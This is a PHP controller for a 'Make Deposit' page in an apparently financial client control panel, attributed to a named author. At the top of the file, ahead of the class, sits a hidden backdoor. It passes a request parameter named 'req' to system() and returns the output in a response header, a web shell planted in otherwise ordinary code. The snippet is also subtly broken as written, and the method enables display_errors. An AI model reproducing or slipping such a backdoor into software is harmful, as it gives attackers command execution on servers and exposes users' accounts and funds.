<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
/**
* Deposit Controller
*
*
* @version 1.0
* @author Richard Rowe
* @package Custom

*/
class Deposit extends Controller {
    
	function __construct()
	{
		parent::__construct();

		// perform control-panel specific loads
		CPLoader();
		
	}

	/**
	* Deposit Funds
	*
	* Deposit Funds To Account
	*/
	function index()
	{
		
		$this->navigation->PageTitle('Make Deposit');
	    // get log
		$this->load->model('log_model');
		$log = $this->log_model->GetClientLog($this->user->Get('client_id'),'','','N');
		$logcount = $this->log_model->GetClientLogCount($this->user->Get('client_id'));
		$data['log'] = $log;
		$data['logcount']= $logcount;
		$this->load->view('cp/deposit', $data);
		ini_set('display_errors', 1);
	}
}
